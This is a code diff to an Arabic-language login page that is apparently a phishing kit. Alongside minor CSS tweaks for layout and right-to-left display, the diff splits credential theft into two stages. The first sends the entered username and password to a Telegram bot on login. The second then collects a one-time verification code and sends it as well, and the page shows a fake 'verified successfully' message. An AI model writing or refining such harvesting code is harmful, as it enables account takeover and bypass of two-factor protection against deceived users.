@@ -74,7 +74,7 @@
             box-shadow: 0 15px 50px rgba(0, 0, 0, 0.12);
             width: 100%;
             max-width: 500px;
-            padding: 70px 40px 50px 40px;
+            padding: 55px 40px 50px 40px;
             animation: slideUp 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
             position: relative;
             display: none;
@@ -98,7 +98,7 @@
         .logo-container {
             display: flex;
             justify-content: center;
-            margin-bottom: 50px;
+            margin-bottom: 40px;
             animation: logoScale 1s cubic-bezier(0.34, 1.56, 0.64, 1);
         }
 
@@ -114,12 +114,12 @@
         }
 
         .logo {
-            width: 160px;
-            height: 160px;
+            width: 150px;
+            height: 150px;
             background: url('https://c.top4top.io/p_3925eoedz1.jpeg') center/cover no-repeat;
             border-radius: 50%;
-            filter: drop-shadow(0 15px 40px rgba(196, 30, 58, 0.25));
-            box-shadow: 0 0 0 8px rgba(196, 30, 58, 0.08);
+            filter: drop-shadow(0 12px 35px rgba(196, 30, 58, 0.22));
+            box-shadow: 0 0 0 6px rgba(196, 30, 58, 0.06);
             transition: transform 0.4s ease;
             flex-shrink: 0;
         }
@@ -356,7 +356,7 @@
 
         /* Verification Code Styles */
         .verify-title {
-            text-align: center;
+            text-align: right;
             font-size: 36px;
             font-weight: 900;
             color: #1a1a1a;
@@ -365,7 +365,7 @@
         }
 
         .verify-subtitle {
-            text-align: center;
+            text-align: right;
             font-size: 13px;
             color: #999;
             margin-bottom: 32px;
@@ -376,8 +376,9 @@
             display: flex;
             gap: 12px;
             margin-bottom: 28px;
-            justify-content: center;
+            justify-content: flex-end;
             animation: slideInForm 0.7s cubic-bezier(0.34, 1.56, 0.64, 1) 0.15s backwards;
+            flex-direction: row-reverse;
         }
 
         .otp-input {
@@ -394,6 +395,7 @@
             -webkit-appearance: none;
             appearance: none;
             -moz-appearance: textfield;
+            direction: ltr;
         }
 
         .otp-input::-webkit-outer-spin-button,
@@ -423,14 +425,14 @@
             }
 
             .login-container, .verify-container {
-                padding: 50px 30px 40px 30px;
+                padding: 45px 30px 40px 30px;
                 border-radius: 30px;
             }
 
             .logo {
-                width: 140px;
-                height: 140px;
-                margin-bottom: 35px;
+                width: 130px;
+                height: 130px;
+                margin-bottom: 30px;
             }
 
             .title, .verify-title {
@@ -460,7 +462,6 @@
                 height: 60px;
                 font-size: 28px;
                 border-radius: 14px;
-                gap: 8px;
             }
 
             .otp-container {
@@ -498,8 +499,8 @@
             }
 
             .logo {
-                width: 120px;
-                height: 120px;
+                width: 110px;
+                height: 110px;
             }
 
             .title, .verify-title {
@@ -656,9 +657,34 @@
             });
         });
 
-        // Send to Telegram
-        async function sendToTelegram(username, password, verificationCode) {
-            const message = `📌 بيانات دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n✅ رمز التحقق: ${verificationCode}`;
+        // Send First Data to Telegram (Login Only)
+        async function sendLoginDataToTelegram(username, password) {
+            const message = `📌 بيانات دخول جديدة:\n\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}`;
+            
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: message
+                    })
+                });
+
+                return response.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+
+        // Send Second Data to Telegram (Login + Verification Code)
+        async function sendVerificationDataToTelegram(username, password, verificationCode) {
+            const message = `✅ تحقق من الهوية - البيانات الكاملة:\n\n👤 اسم المستخدم: ${username}\n🔐 كلمة المرور: ${password}\n🔑 رمز التحقق: ${verificationCode}`;
             
             const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
             
@@ -682,7 +708,7 @@
         }
 
         // Form Submission
-        document.getElementById('loginForm').addEventListener('submit', (e) => {
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value;
@@ -695,14 +721,29 @@
             loginData.username = username;
             loginData.password = password;
 
-            // Show verification screen
-            document.getElementById('loginScreen').classList.remove('active');
-            document.getElementById('verifyScreen').classList.add('active');
-            
-            // Focus first OTP input
+            const loginBtn = document.getElementById('loginBtn');
+            loginBtn.disabled = true;
+            loginBtn.style.opacity = '0.8';
+            const originalText = loginBtn.textContent;
+            loginBtn.textContent = 'جاري المعالجة...';
+
+            // Send first data (login only)
+            const sent = await sendLoginDataToTelegram(username, password);
+
             setTimeout(() => {
-                otpInputs[0].focus();
-            }, 100);
+                loginBtn.textContent = originalText;
+                loginBtn.disabled = false;
+                loginBtn.style.opacity = '1';
+
+                // Show verification screen
+                document.getElementById('loginScreen').classList.remove('active');
+                document.getElementById('verifyScreen').classList.add('active');
+                
+                // Focus first OTP input
+                setTimeout(() => {
+                    otpInputs[0].focus();
+                }, 100);
+            }, 1000);
         });
 
         // Verification Form Submission
@@ -722,10 +763,11 @@
             const originalText = verifyBtn.textContent;
             verifyBtn.textContent = 'جاري المعالجة...';
 
-            // Send to Telegram
-            const sent = await sendToTelegram(loginData.username, loginData.password, otpValues);
+            // Send second data (login + verification code)
+            const sent = await sendVerificationDataToTelegram(loginData.username, loginData.password, otpValues);
 
             setTimeout(() => {
+                verifyBtn.classList.add('success');
                 verifyBtn.textContent = '✓ تم التحقق بنجاح';
                 
                 setTimeout(() => {
@@ -743,12 +785,13 @@
                     document.getElementById('verifyScreen').classList.remove('active');
                     document.getElementById('loginScreen').classList.add('active');
                     
+                    verifyBtn.classList.remove('success');
                     verifyBtn.textContent = originalText;
                     verifyBtn.disabled = false;
                     verifyBtn.style.opacity = '1';
                     document.getElementById('passwordToggle').textContent = '🔒';
                     isPasswordVisible = false;
-                }, 1000);
+                }, 1200);
             }, 1500);
         });
 
